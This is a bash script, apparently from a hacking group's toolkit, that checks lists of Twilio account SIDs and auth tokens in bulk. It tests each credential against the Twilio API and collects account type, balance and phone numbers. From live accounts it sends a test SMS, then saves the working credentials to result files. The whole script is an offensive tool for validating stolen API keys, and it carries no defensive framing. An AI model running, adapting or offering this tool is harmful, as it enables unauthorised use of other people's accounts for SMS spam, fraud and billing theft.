# !/bin/bash
# JAVAGHOST TWILIO CHECKER - CREATED BY : ./LAZYBOY - JAVAGHOST TEAM

# COLOR ( BOLD )
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
MAGENTA="\e[1;35m"
CYAN="\e[1;36m"
WHITE="\e[1;37m"

# BASE URL TWILIO API
BASE_URL="https://api.twilio.com/2010-04-01"

# BODY MESSAGE ( U CAN CHANGE BY UR FUCKING SELF )
BODY_MSG="JAVAGHOST TWILIO CHECKER - WORK : $(echo "${TWILIO_AUTH}" | tr "a1i2u3e4o" "*")"

# CREATE DIR
if [[ ! -d Results ]]; then
	mkdir Results
	# CREATE OUTPUT FILES
	OUTPUT_FILES=("TWILIO_CANT_GET_NUM" "TWILIO_CAN_SEND" "TWILIO_CANT_SEND" "TWILIO_TRIAL" "TWILIO_DEAD_AUTH" "TWILIO_TEST_ACC" "UNKNOWN_ERROR")
	for LST_OUTPUT in ${OUTPUT_FILES[@]}; do
		touch Results/${LST_OUTPUT}-$(date +"%Y-%m-%d").txt TWILIO_AUTH.tmp
	done
fi

# BANNER
echo -e '''
				\e[1;37m
		     ┌┬┐┬ ┬┬┬  ┬┌─┐   ┌─┐
		      │ │││││  ││ │───│  
		      ┴ └┴┘┴┴─┘┴└─┘   └─┘
		 - JAVAGHOST TWILIO CHECKER -
'''

# ASK OPTION
read -p "$(echo -e "${WHITE}[ ${GREEN}? ${WHITE}] TYPE [ ${GREEN}1 ${WHITE}] FOR SINGLE CHECK OR TYPE [ ${GREEN}2 ${WHITE}] FOR MASS CHECK : ${GREEN}")" ASK_OPT

# CHECK OPTIONS
if [[ $ASK_OPT == "1" ]]; then
	# ASK TWILIO AUTH
	read -p "$(echo -e "\n${WHITE}[ ${GREEN}? ${WHITE}] INPUT TWILIO SID   : ${GREEN}")" ASK_SID
	read -p "$(echo -e "${WHITE}[ ${GREEN}? ${WHITE}] INPUT TWILIO TOKEN : ${GREEN}")" ASK_TOKEN
	if [[ -z $ASK_SID ]] || [[ -z $ASK_TOKEN ]] ; then
		echo -e "${WHITE}[ ${RED}ERROR ${WHITE}] - ${RED}PLEASE INPUT VALID TWILIO AUTH${WHITE}"
		exit
	else
		echo "${ASK_SID}:${ASK_TOKEN}" > TWILIO_AUTH.tmp
	fi
elif [[ $ASK_OPT == "2" ]]; then
	# ASK FILES
	read -p "$(echo -e "${WHITE}[ ${GREEN}? ${WHITE}] INPUT YOUR LIST TWILIO AUTH : ${GREEN}")" ASK_FILE
	if [[ ! -e $ASK_FILE ]]; then
		echo -e "${WHITE}[ ${RED}ERROR ${WHITE}] - ${RED}LIST NOT FOUND IN YOUR DIRECTORY${WHITE}"
		exit
	else
		if [[ $(file $ASK_FILE) =~ "line terminators" ]]; then
			# CONVERT DOS FORMAT TO UNIX FORMAT
			sed -i 's/\x0D$//' $ASK_FILE
			cat $ASK_FILE | sort -u > TWILIO_AUTH.tmp
		else
			cat $ASK_FILE | sort -u > TWILIO_AUTH.tmp
		fi
	fi
else
	echo -e "${WHITE}[ ${RED}ERROR ${WHITE}] - ${RED}YOU SELECTED WRONG OPTION${WHITE}"
	exit
fi

# FUNC FOR MAKING TWILIO REQUEST
function TWILIO_REQ(){
	curl -sXGET "${BASE_URL}/${1}" -u "${TWILIO_AUTH}"
}

# MAIN SCRIPT
function TWILIO_CHECKER(){
	# GET SID VALUE FROM TWILIO AUTH
	local TWILIO_SID=$(echo "${TWILIO_AUTH}" | cut -d ":" -f1)
	local CHECK_AUTH=$(TWILIO_REQ "Accounts/${TWILIO_SID}.json")

	# CHECKING TWILIO AUTH
	if [[ $CHECK_AUTH =~ "friendly_name" ]]; then
	
		# GET INFROMATION ABOUT THE SID + TOKEN
		local GET_TYPE_ACC=$(TWILIO_REQ "Accounts.json" | grep -Po '"type": "\K[^"]+')
		local GET_FROM_NUM=$(TWILIO_REQ "Accounts/${TWILIO_SID}/IncomingPhoneNumbers.json" | grep -Po '"incoming_phone_numbers": "\K[^"]+')
		local GET_CREDIT=$(TWILIO_REQ "Accounts/${TWILIO_SID}/Balance.json" | grep -Po '"(currency|balance)": "\K[^"]+' | sed -n '1{h;d};2{p;x;};p' | sed '/./{:a;N;s/\n\(.\)/ \1/;ta}')
		local GET_ERROR_MSG=$(echo $CHECK_AUTH | grep -Po '"more_info": "\K[^"]+')

		if [[ $GET_TYPE_ACC == "Full" ]]; then
			if [[ -z $GET_FROM_NUM ]]; then
				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED FOR GET FROM NUMBER\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIPPED FOR CHECK SEND${WHITE}"
				echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:FAILED GET FROM NUM [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_GET_NUM-$(date +"%Y-%m-%d").txt
			else
				# SENDING MSG
				local CHECK_SEND=$(curl -sXPOST "${BASE_URL}/Accounts/${TWILIO_SID}/Messages.json" \
										--data-urlencode "Body=${BODY_MSG}" --data-urlencode "From=${GET_FROM_NUM}" --data-urlencode "To=${TO_NUMBER}" \
										-u "${TWILIO_AUTH}" | grep -Po '"status": "\K[^"]+')

				# CHECKING RESPONSE SENDING MSG
				if [[ $CHECK_SEND == "sent" || $CHECK_SEND == "queued" || $CHECK_SEND == "delivered" ]]; then
					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${GREEN}SUCCESS SEND TO NUM : ${GREEN}${TO_NUMBER}${WHITE}"
					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:WORK SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CAN_SEND-$(date +"%Y-%m-%d").txt
				elif [[ $CHECK_SEND == "failed" || $CHECK_SEND == "undelivered" ]]; then
					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${RED}FAILED SEND TO NUM : ${RED}${TO_NUMBER}${WHITE}"
					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:FAILED SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_SEND-$(date +"%Y-%m-%d").txt
				else
					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${RED}CHEK SEND UNKNOWN ERROR${WHITE}"
					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:FAILED SEND - UNKNOWN ERROR TEST SEND [ ACC TYPE : FULL ]" >> Results/UNKNOWN_ERROR-$(date +"%Y-%m-%d").txt
				fi			
			fi
		elif [[ $GET_TYPE_ACC == "Trial" ]]; then
			if [[ -z $GET_FROM_NUM ]]; then
				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED GET FROM NUMBER\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_CREDIT}:FAILED GET FROM NUM [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt				
			else
				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_CREDIT}:${GET_FROM_NUM} [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt
			fi
		else
			echo -e "\n ${WHITE}[ ${RED}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID} : ${RED}UNKNOWN ERROR${WHITE}"
			echo "TWILIO AUTH : ${TWILIO_AUTH}:UNKNOWN ERROR CHECKING TYPE ACC" >> Results/UNKNOWN_ERROR-$(date +"%Y-%m-%d").txt
		fi

	elif [[ $CHECK_AUTH =~ "Test Account" ]]; then
		echo -e "\n ${WHITE}[ ${RED}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID} : ${RED}TEST ACCOUNT - SKIPPED FOR GET ANOTHER INFORMATION${WHITE}"
		echo "TWILIO AUTH : ${TWILIO_AUTH}:TEST ACCOUNT - MORE INFO ABOUT THIS : ${GET_ERROR_MSG}" >> Results/TWILIO_TEST_ACC-$(date +"%Y-%m-%d").txt
	elif [[ $CHECK_AUTH =~ "Authenticate" ]]; then
		echo -e "\n ${WHITE}[ ${RED}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID} : ${RED}BAD AUTH${WHITE}"
		echo "TWILIO AUTH : ${TWILIO_AUTH}:DEAD SID AND TOKEN" >> Results/TWILIO_DEAD_AUTH-$(date +"%Y-%m-%d").txt
	else
		echo -e "\n ${WHITE}[ ${RED}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID} : ${RED}UNKNOWN ERROR${WHITE}"
		echo "TWILIO AUTH : ${TWILIO_AUTH}:UNKNOWN ERROR CHECKING ACC" >> Results/UNKNOWN_ERROR-$(date +"%Y-%m-%d").txt
	fi
}

# MULTI THREAD
for TWILIO_AUTH in $(cat TWILIO_AUTH.tmp); do
	TWILIO_CHECKER "${TWILIO_AUTH}" &
	while (( $(jobs | wc -l) >= 5 )); do
		sleep 0.1s
		jobs > /dev/null
	done
done
wait

# CHECK TMP FILES
if [[ -e TWILIO_AUTH.TMP ]]; then
	rm TWILIO_AUTH.tmp
fi

echo -e "\n${WHITE}[ ${GREEN}+ ${WHITE}] ${GREEN}GOOD TWILIO SAVED IN : ${GREEN}$(pwd)/Results/TWILIO_CAN_SEND-$(date +"%Y-%m-%d").txt${WHITE}"
